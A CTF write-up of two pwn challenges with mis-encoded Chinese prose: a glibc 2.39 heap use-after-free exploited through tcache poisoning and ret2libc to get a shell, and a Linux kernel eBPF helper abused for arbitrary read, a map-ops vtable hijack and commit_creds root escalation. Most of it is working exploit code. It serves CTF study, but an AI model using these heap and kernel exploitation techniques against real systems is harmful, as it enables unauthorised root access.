#+TITLE: BITs2CTF 2025 Writeup Part 2
#+DATE: <2026-01-19 Mon>

[[file:wp_bits2ctf_2025.org][Part 1]]

è¿™ä¸¤é“æ˜¯æœ‰ä¸€äº›éš¾åº¦ï¼Œæ¯”èµ›æ—¶æ²¡åšå‡ºæ¥çš„

* pwn - ç‰©ç†å®žéªŒé€‰è¯¾ç³»ç»Ÿ
#+BEGIN_EXAMPLE
|-------------------------------------|
| BITs2CTF  ~  ç‰©ç†å®žéªŒè¯¾ï¼Œæˆ‘ä»¬å–œæ¬¢ä½  |
|-------------------------------------|

   ç‰©ç†å®žéªŒè¯¾ï¼Œæˆ‘ä»¬å–œæ¬¢ä½ ~â†‘ðŸŽ¶ðŸ‘‹ðŸ¼ðŸ¤“ðŸ‘‹ðŸ¼ðŸŽ¤

   æˆ‘ä»¬å–œæ¬¢ç£æ„Ÿçº¿ï¼Œå¯†ç«‹æ ¹ï¼Œå¼—å…°å…‹~ðŸ˜

   ç‰©ç†å®žéªŒè¯¾ï¼Œæˆ‘ä»¬å–œæ¬¢ä½ ï½žâ†‘ðŸŽ¶ðŸ¤“ðŸ‘ðŸ»

   å…‰å¹²æ¶‰ï¼ŒRLCï¼Œæ™®æœ—å…‹ï¼Œç¤º~æ³¢~å™¨~ðŸŽ¶ðŸ˜‹

[*] æ¬¢è¿Žæ¥åˆ°ã€ŒBIT ~ ç‰©ç†å®žéªŒé€‰è¯¾ã€ç½‘ç«™
#+END_EXAMPLE
#+BEGIN_EXAMPLE
[!] ã€æ—·è¯¾æ‰£åˆ†æé†’ï¼ï¼ï¼ã€‘å„ä½åŒå­¦ï¼šè¯·åŠ¡å¿…æŒ‰æ—¶ä¸Šè¯¾ï¼Œå¦‚ä¸è¯¾å‰è‡ªè¡Œé€€é€‰å®žéªŒï¼Œä¸æ¥ä¸Šè¯¾çš„å±žäºŽæ—·è¯¾ï¼Œæ¯æ¬¡æ—·è¯¾ï¼ŒæœŸæœ«è¯¾ç¨‹æ€»åˆ†æ‰£3åˆ†ï¼ï¼ï¼
#+END_EXAMPLE
ä¸€é“å…¸åž‹çš„å † UAFï¼ŒGLIBC_2.39ï¼Œdelete_course ä¹‹åŽè¿˜å¯ä»¥ r/w é‚£ä¸ªæŒ‡é’ˆã€‚
ä½¿ç”¨ unsorted bin + tcache + environ

å…ˆæ˜¯ tcache æ³„éœ²å †åŸºå€ï¼Œunsorted bin æ³„éœ² libc åŸºå€
#+BEGIN_SRC python
add_lecture(4, 65) #1
add_lecture(9, 2) #2
add_lecture(9, 2) #3

delete_lecture(1)
delete_lecture(2)
delete_lecture(3)

show_lecture(1)

unsorted_fdbk = u64(io.recv(8))
main_arena = unsorted_fdbk - 0x60
libc_base = main_arena - 0x0203AC0
print('libc_base', hex(libc_base))
environ = libc_base + 0x7f3c1a20ad58 - 0x7f3c1a000000

show_lecture(2)
tcache_aslr_base = u64(io.recv(8))
tcache_key = u64(io.recv(8))
print(hex(tcache_aslr_base))
#+END_SRC

ç„¶åŽ tcache poisoning ä½¿ä¸‹ä¸€ä¸ª malloc è¿”å›ž environ-24ï¼Œæ³„éœ²æ ˆæŒ‡é’ˆ
#+BEGIN_EXAMPLE
pwndbg> telescope &environ
00:0000â”‚  0x7f489dc0ad58 (environ) â€”â–¸ 0x7ffc9bc75308 â€”â–¸ 0x7ffc9bc757e1 â—‚â€” 'COLORTERM=truecolor'
#+END_EXAMPLE
ï¼ˆå› ä¸ºæ³¨æ„åˆ°è¿™é‡Œ environ ä¸æ˜¯ 16 å¯¹é½çš„ï¼Œç„¶åŽå‘çŽ° environ-8 ä¼šæŠŠ environ é‡Œçš„æŒ‡é’ˆæ¸…é›¶ï¼‰
#+BEGIN_SRC python
edit_lecture(3, p64((environ-24) ^ tcache_aslr_base))

add_lecture(9, 2) #4
add_lecture(9, 2) #5
show_lecture(5)

io.recv(24)
stack_addr = u64(io.recv(8))
print(hex(stack_addr))
#+END_SRC

å†æ¥ä¸€ä¸ª tcache poisoning ä½¿ malloc è¿”å›žæ ˆæŒ‡é’ˆ
#+BEGIN_SRC python
rbp_addr = stack_addr - 0xab058 + 0xaaf10

add_lecture(9, 3) #6
add_lecture(4, 3) #7
delete_lecture(6)
delete_lecture(7)

edit_lecture(7, p64((rbp_addr) ^ tcache_aslr_base))

add_lecture(4, 3) #8
add_lecture(4, 3) #9
#+END_SRC

æœ€åŽç›´æŽ¥ ret2libc
#+BEGIN_SRC python
poprdiret = 0x000000000010f78b
ret = 0x000000000002882f
binsh = 0x00000000001cb42f
system = elf.libc.symbols["system"]

edit_lecture(9, cyclic(8) + p64(poprdiret+libc_base) + p64(binsh+libc_base) + p64(ret+libc_base) + p64(system+libc_base+1))

# gdb.attach(io)
sla('æ“ä½œï¼š', '5')
io.sendline('cat /flag')

io.interactive()
#+END_SRC

* pwn - ðŸ¥·å¿æœ¯ðŸ¥·ã€Œå†™æ­»ä½  â€¢ å†…æ ¸åŽŸè¯­ã€
è¿™æ˜¯æˆ‘åšçš„ç¬¬ä¸€é“å†…æ ¸é¢˜å“ˆå“ˆã€‚
bpf æ¿å­å‚è€ƒ [[https://nazrinduck.github.io/2025/04/15/ebpf1/#è°ƒç”¨æ¨¡æ¿][é©¬è€å¸ˆ]]

é¦–å…ˆçŸ¥é“æˆ‘ä»¬æ‰‹å¤´æœ‰ä»€ä¹ˆï¼Œç›®æ ‡æ˜¯ä»€ä¹ˆã€‚
#+BEGIN_SRC c
BPF_CALL_3(bpf_bits2bpf, struct bpf_map *, map, s64, offset, u64, val)
{
	s64 *map_ptr = (s64 *)(map);
	if (offset >= 0x0 && offset < (0x200 / 0x8)) {
		// å†™æ­»ä½ ,
		// å†…æ ¸åŽŸè¯­(Kernel Primitive)
		map_ptr[offset] = val;
		return 0;
	}
	return 1;
}
#+END_SRC
çŽ°åœ¨æœ‰çš„æ˜¯ struct bpf_map ä¸­å‰ 0x200 çš„ä»»æ„å†™ï¼Œbpf_map åªæœ‰ 240 å¤§å°ï¼Œæ„å‘³ç€å¯ä»¥å†™åˆ°å¤–é¢åŽ»ã€‚
ä½†è¿™ç‚¹å¤§å°å¯¹äºŽå†…æ ¸ç©ºé—´æ¥è¯´è¿˜æ˜¯å¤ªå°äº†ï¼Œè‚¯å®šä¸èƒ½ç”¨äºŽä»»æ„åœ°å€å†™ã€‚

ç›®æ ‡æ˜¯æŠŠå½“å‰è¿›ç¨‹æ”¹ä¸º uid0ï¼Œé‚£ä¹ˆæœ‰ä¸¤ç§åŠžæ³•ï¼Œå°† task_struct ä¸­ cred æ”¹ä¸º &init_credï¼Œæˆ– commit_cred(&init_cred)ã€‚
å‰è€…éœ€è¦ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼ŒåŽè€…éœ€è¦æ‰§è¡Œå‡½æ•°ã€‚

æœ€åˆï¼Œä¸€ä¸ªå¾ˆæœ´ç´ çš„æƒ³æ³•å°±æ˜¯ä¿®æ”¹ bpf_map ä¸­çš„ max_entries ä¸º -1ï¼Œå°±å¯ä»¥ OOB è¯»å†™ï¼Œ
#+BEGIN_SRC c
#define BPF_FUNC_bits2bpf 212
#define EVIL_MAX_ENTRIES_VALUE 0xFFFFFFFF00000008
#define MAP_MAX_ENTRIES_OFFSET_S64  4

int bpf_prog_load_once(int map_fd) {
    const struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
          
        // r2 = offset (s64 index)
        BPF_MOV64_IMM(BPF_REG_2, MAP_MAX_ENTRIES_OFFSET_S64),
          
        // r3 = value (new max_entries)
        BPF_LD_IMM64_RAW(BPF_REG_3, 0, EVIL_MAX_ENTRIES_VALUE),
          
        // Call helper bits2bpf(map, offset, val)
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
          
        // Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
    ...
}


int main() {
    ...
    uint32_t key = 114514;
    uint64_t val = 0;
    if (bpf_lookup_elem(map_fd, &key, &val) == 0) {
        printf("[+] OOB Read Successful! Val at idx %d: 0x%lx\n", key, val);
    } else {
        error(1, "[-] Exploit failed: max_entries not corrupted.");
    }
}
#+END_SRC
é‚£ä¹ˆ *å¦‚æžœ* task_struct åœ¨ bpf_map çš„é«˜åœ°å€ï¼Œå°±å¯ä»¥æŒ‰ comm æ‰¾åˆ°å¹¶ä¿®æ”¹ credã€‚ï¼ˆç„¶è€Œæœ€åŽå‘çŽ°å®žåœ¨ä½Žåœ°å€ï¼‰

ç„¶åŽå°±ç¿»å¥½å¤šèµ„æ–™ï¼Œå‘çŽ°äº†è¿™å‡ ä¸ª å¾ˆï¼ˆå¯ï¼‰æœ‰ï¼ˆä»¥ï¼‰å¸®ï¼ˆç…§ï¼‰åŠ©ï¼ˆæŠ„ï¼‰ï¼š
1. [[https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2/blob/main/d3bpf/exp/source/core.c][d3ctf2022-pwn-d3bpf-and-v2]]
2. [[https://web.archive.org/web/20220308210028/https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story][Kernel Pwning with eBPF: a Love Story]]
3. [[https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification][Linux Kernel Privilege Escalation via Improper eBPF Program Verification]]

é¦–å…ˆæ˜¯ä»»æ„åœ°å€è¯»ï¼Œå¯ä»¥é€šè¿‡æŠŠ bpf_map ä¸­çš„ btf å†™æˆ someaddr - offsetof(struct btf, id)ï¼Œ
ç„¶åŽ BPF_OBJ_GET_INFO_BY_FD å°±èƒ½è¿”å›žä¸€ä¸ª u32
#+BEGIN_SRC c
#define OFFSET_FROM_DATA_TO_BTF_ID                  0x58
uint32_t kernel_read_uint32(int map_fd, uintptr_t addr) {
    const struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
          
        // r2 = offset (s64 index)
        BPF_MOV64_IMM(BPF_REG_2, BTF_OFFSET_S64),
          
        // r3 = value (btf)
        BPF_LD_IMM64(BPF_REG_3, addr - OFFSET_FROM_DATA_TO_BTF_ID),
          
        // Call helper bits2bpf(map, offset, val)
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),

        // Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
  
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = ptr_to_u64(&insns),
        .insn_cnt = sizeof(insns) / sizeof(struct bpf_insn),
        .license = ptr_to_u64("GPL"),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 2,
    };
  
    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0)
        err(1, "Error while loading bpf program (kernel_read)");

    int ret = trigger1(prog_fd);
    if (ret < 0)
        err(1, "Error while trigger bpf program");

    struct bpf_map_info info = {0};
    union bpf_attr info_attr = {
        .info.bpf_fd = map_fd,
        .info.info = (long long unsigned int) &info,
        .info.info_len = sizeof(info)
    };

    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &info_attr, sizeof(info_attr));
    if (ret < 0)
        err(1, "Failed to get map info");

    close(prog_fd); // !!!

    return info.btf_id;
}
#+END_SRC
å¥½ï¼Œé‚£çŽ°åœ¨æ‹¿åˆ°è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ[1] å’Œ [3] éƒ½ç”¨äº† init_pid_ns å’ŒåŸºæ•°æ ‘ï¼ŒGemini å‘Šè¯‰æˆ‘å¯ä»¥ç›´æŽ¥é¡ºç€ init_task->tasks é“¾è¡¨éåŽ†ï¼ˆç”±äºŽ nokaslrï¼‰
ç„¶åŽåˆ¤æ–­ä¸€ä¸‹ comm æ˜¯å¦ä¸ºå½“å‰è¿›ç¨‹å exploit å°±è¡Œï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†å½“å‰è¿›ç¨‹çš„ task_struct

å»¶ç»­ä¹‹å‰çš„æ€è·¯ï¼Œå¦‚æžœæˆ‘èƒ½æ‰¾åˆ° task_struct ä¸Ž bpf_array çš„ç›¸å¯¹åç§»ï¼Œå°±èƒ½åˆ©ç”¨ä¸Šæ–‡çš„ OOB å†™æ”¹ credã€‚
é‚£é—®é¢˜å°±å˜æˆäº†æ‰¾ bpf_array çš„åœ°å€ï¼Œæ—¢ç„¶éƒ½æ‰¾åˆ°äº† task_structï¼Œè¿™å¹¶ä¸éš¾ï¼Œå› ä¸º map_fd å°±æ˜¯ä¸€ä¸ªå½“å‰è¿›ç¨‹çš„ fdã€‚

#+BEGIN_SRC c
uintptr_t find_bpf_map_addr(int map_fd, uintptr_t task) {
    // task_struct->files
    uintptr_t files_addr;
    kernel_read(map_fd, task + TASK_FILES_OFF, sizeof(uintptr_t), &files_addr);
    printf("struct files_struct *\t%p\n", files_addr);

    // task_struct->files->fd_array[map_fd]
    uintptr_t map_file_addr;
    kernel_read(map_fd, files_addr + FILES_STRUCT_FDARRAY_OFF + 8 * map_fd , sizeof(uintptr_t), &map_file_addr);
    printf("struct file *\t%p\n", map_file_addr);

    // task_struct->files->fd_array[map_fd]->private_data
    uintptr_t bpf_map_addr;
    kernel_read(map_fd, map_file_addr + FILE_PRIVATE_DATA_OFF, sizeof(uintptr_t), &bpf_map_addr);
    printf("struct bpf_map *\t%p\n", bpf_map_addr);
    ...
#+END_SRC
ç„¶åŽæˆ‘å°±å‘çŽ°ï¼Œtask_struct æ˜¯åœ¨ bpf_map æ›´é«˜çš„åœ°å€ï¼Œéš¾æ€ªæœ€å¼€å§‹çš„æƒ³æ³•èµ°ä¸é€šã€‚
å…¶å®žåˆ°äº†è¿™ä¸€æ­¥ï¼Œä¹Ÿå°±å¿«å®Œæˆäº†ã€‚[3] ä¸­æåˆ°äº†å¯ä»¥æ›¿æ¢ map_push_elem ä¸º map_get_next_key è¾¾æˆä»»æ„åœ°å€å†™ï¼Œ
ä½† [1] ä¸­ç”¨çš„æ˜¯ work_for_cpu_fnï¼Œé—® Geminiï¼Œå‘Šè¯‰æˆ‘è¿™æ˜¯ä¸ªä¸‡èƒ½ gadgetã€‚
#+BEGIN_SRC c
struct work_for_cpu {
	struct work_struct work;
	long (*fn)(void *);
	void *arg;
	long ret;
};

static void work_for_cpu_fn(struct work_struct *work)
{
	struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);

	wfc->ret = wfc->fn(wfc->arg);
}
#+END_SRC

å‰©ä¸‹çš„å°±æ˜¯æŠŠ vtable æ‹·å‡ºæ¥ä¸€ä»½ï¼ŒæŠŠ map_get_next_key æ”¹æˆ work_for_cpu_fnï¼Œå†™å›ž mapï¼Œå†æŠŠåœ°å€å†™å›ž opsï¼Œ
è€Œå…ƒç´ çš„åœ°å€å…¶å®žå°±åœ¨ bpf_map åŽé¢ã€‚
#+BEGIN_SRC c
struct bpf_array {
	struct bpf_map map;
	u32 elem_size;
	u32 index_mask;
	struct bpf_array_aux *aux;
	union {
		DECLARE_FLEX_ARRAY(char, value) __aligned(8);
		DECLARE_FLEX_ARRAY(void *, ptrs) __aligned(8);
		DECLARE_FLEX_ARRAY(void __percpu *, pptrs) __aligned(8);
	};
};
#+END_SRC

#+BEGIN_SRC c
    ...
    // (struct bpf_map *)(task_struct->files->fd_array[map_fd]->private_data)->ops
    uintptr_t map_ops_addr;
    kernel_read(map_fd, bpf_map_addr, sizeof(uintptr_t), &map_ops_addr);
    printf("struct bpf_map_ops *\t%p\n", map_ops_addr);

    uintptr_t array_map_ops[5] = {0}; // only need first 5 ops actually
    kernel_read(map_fd, map_ops_addr, 5 * 8, array_map_ops);
    printf("map_get_next_key = %p\n", array_map_ops[4]);

    array_map_ops[4] = work_for_cpu_fn_addr;

    uint64_t key = 0;
    bpf_update_elem(map_fd, &key, array_map_ops, 0);

    const struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_LD_IMM64(BPF_REG_3, bpf_map_addr + MAP_DATA_OFF),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
  
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = ptr_to_u64(&insns),
        .insn_cnt = sizeof(insns) / sizeof(struct bpf_insn),
        .license = ptr_to_u64("GPL"),
        .log_buf = ptr_to_u64(bpf_log_buf),
        .log_size = LOG_BUF_SIZE,
        .log_level = 2,
    };
  
    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (prog_fd < 0)
        err(1, "Error while loading bpf program (hijack)");

    int ret = trigger1(prog_fd);
    if (ret < 0)
        err(1, "Error while trigger bpf program");

    puts("[+] hijack vtable done.");
}
#+END_SRC

ä¹‹åŽå°±æ˜¯å†åˆ©ç”¨é¢˜ç›®çš„å†…æ ¸åŽŸè¯­ï¼ŒæŠŠ bpf_map æ”¹æˆ work_for_cpu çš„å½¢å¼ï¼Œè°ƒç”¨ BPF_MAP_GET_NEXT_KEY å°±èƒ½æ‰§è¡Œ commit_cred(&init_cred) äº†ã€‚
#+BEGIN_SRC c
void load_work(int map_fd) {
    const struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 32/8),
        BPF_LD_IMM64(BPF_REG_3, commit_cred), // long int (*fn)(void *)
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),

        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_2, 40/8),
        BPF_LD_IMM64(BPF_REG_3, init_cred),  // void * arg
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
    ...
#+END_SRC

[[https://gist.github.com/dongdigua/219dd190bd9191f2bc860e5c69f54546][æ•´ä¸ª exp]] å¤§ä½“ä¸Š +å‚è€ƒ+ ç…§æŠ„ [[https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2][d3bpf]]ï¼ŒæŽ¨èçœ‹ä¸€ä¸‹äººå®¶çš„ writeup å’Œ expã€‚

